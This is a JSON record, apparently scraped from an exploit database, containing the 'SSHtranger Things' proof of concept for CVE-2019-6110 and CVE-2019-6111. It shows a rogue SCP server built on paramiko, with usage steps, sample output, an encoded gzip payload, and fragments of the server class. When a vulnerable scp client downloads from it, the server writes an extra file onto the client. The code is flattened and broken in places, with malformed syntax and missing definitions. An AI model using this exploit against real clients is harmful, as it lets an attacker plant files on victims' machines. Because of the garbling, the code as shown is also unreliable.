{
    "text": "vul_name : SSHtranger Things SCP Client File Issue ， vul_cve : CVE-2019-6110 , CVE-2019-6111 ， vul_poc :  # Exploit Title : SSHtranger Things ，  # Date : 2019-01-17 ，  # Exploit Author : Mark E. Haase <mhaase @ hyperiongray.com> ，  # Vendor Homepage :  ，  # Software Link :  [ download link if available ]  ，  # Version : OpenSSH 7.6p1 ，  # Tested on : Ubuntu 18.04.1 LTS ，  # CVE : CVE-2019-6111 , CVE-2019-6110 ， ' ， Title : SSHtranger Things ， Author : Mark E. Haase <mhaase @ hyperiongray.com> ， Homepage :  ， Date : 2019-01-17 ， CVE : CVE-2019-6111 , CVE-2019-6110 ， Advisory :  ， Tested on : Ubuntu 18.04.1 LTS , OpenSSH client 7.6p1 ， We have nicknamed this \"SSHtranger Things\" because the bug is so old it could be ， exploited by an 8-bit Demogorgon. Tested on Python 3.6.7 and requires `paramiko` ， package. ， The server listens on port 2222. It accepts any username and password , and it ， generates a new host key every time you run it. ，  $ python3 sshtranger_things.py ， Download a file using a vulnerable client. The local path must be a dot :  ，  $ scp -P 2222 foo @ localhost : test.txt . ， The authenticity of host ' [ localhost ]  : 2222 (  [ 127.0.0.1 ]  : 2222 ) ' can't be established. ， RSA key fingerprint is SHA256 : C7FhMqqiMpkqG9j+11S2Wv9lQYlN1jkDiipdeFMZT1w. ， Are you sure you want to continue connecting ( yes/no ) ? yes ， Warning : Permanently added ' [ localhost ]  : 2222' ( RSA ) to the list of known hosts. ， foo @ localhost's password :  ， test.txt 100% 32 0.7KB/s 00 : 00 ， The file you requested ( e.g. test.txt ) will be saved in your current directory. ， If your client is vulnerable , you will have an additional file \"exploit.txt\" ， created in your current directory. ，  $ cat test.txt ， This is the file you requested. ，  $ cat exploit.txt ， SSHtranger Things ， The interesting code is in ScpServer.send_file (  ) . ， ' ， logging.basicConfig ( level=logging.INFO )  ， dummy = 'This is the file you requested.\\n' ， payload = gzip.decompress ( base64.b64decode (  ， b'H4sIAAa+QFwC/51VQW4CMQy85xV+AX+qqrZwoFSo0orbHvbQQw9NIiH1Af0YLyndjZ2x46' ， b'ygaIGs43jGTjIORJfzh3nIN/IwltH1b+LHeGdxHnXUsoCWD6yYyjt7AfA1XJdLDR8u5yRA' ， b'1/lEjiHbHGafXOMVpySuZaH4Jk1lgjxoocN5YMhRoNhhpA5EWMhlRHBNCWogZYhOnmk2V7' ， b'C4FJgwHxKSEwEzTskrQITtj1gYIurAhWUfsDbWIFyXlRwDc8okeZkCzNyjlMmcT4wxA39d' ， b'zp8OsJDJsGV/wV3I0JwJLNXKlOxJAs5Z7WwqmUZMPZmzqupttkhPRd4ovE8jE0gNyQ5skM' ， b'uVy4jk4BljnYwCQ2CUs53KtnKEYkucQJIEyoGud5wYXQUuXvimAYJMJyLlqkyQHlsK6XLz' ， b'I6Q6m4WKYmOzjRxEhtXWBA1qrvmBVRgGGIoT1dIRKSN+yeaJQQKuNEEadONJjkcdI2iFC4' ， b'Hs55bGI12K2rn1fuN1P4/DWtuwHQYdb+0Vunt5DDpS3+0MLaN7FF73II+PK9OungPEnZrc' ， b'dIyWSE9DHbnVVP4hnF2B79CqV8nTxoWmlomuzjl664HiLbZSdrtEOdIYVqBaTeKdWNccJS' ， b'J+NlZGQJZ7isJK0gs27N63dPn+oefjYU/DMGy2p7en4+7w+nJ8OG0eD/vwC6VpDqYpCwAA' ， class ScpServer ( paramiko.ServerInterface )  :  ， self.event = threading.Event (  )  ， logging.info ( 'Authenticated with %s : %s' , username , password )  ， logging.info ( 'Opened session channel %d' , chanid )  ， command = command.decode ( 'ascii' )  ， logging.info ( 'Approving exec request : %s' , command )  ， parts = command.split ( ' ' )  ，  # Make sure that this is a request to get a file :  ， assert parts [ 0 ] = 'scp' ， assert '-f' in parts ， file = parts [ -1 ]  ，  # Send file from a new thread. ， threading.Thread ( target=self.send_file , args= ( channel , file ) .start (  )  ， '",
    "time": "2019.01.19"
}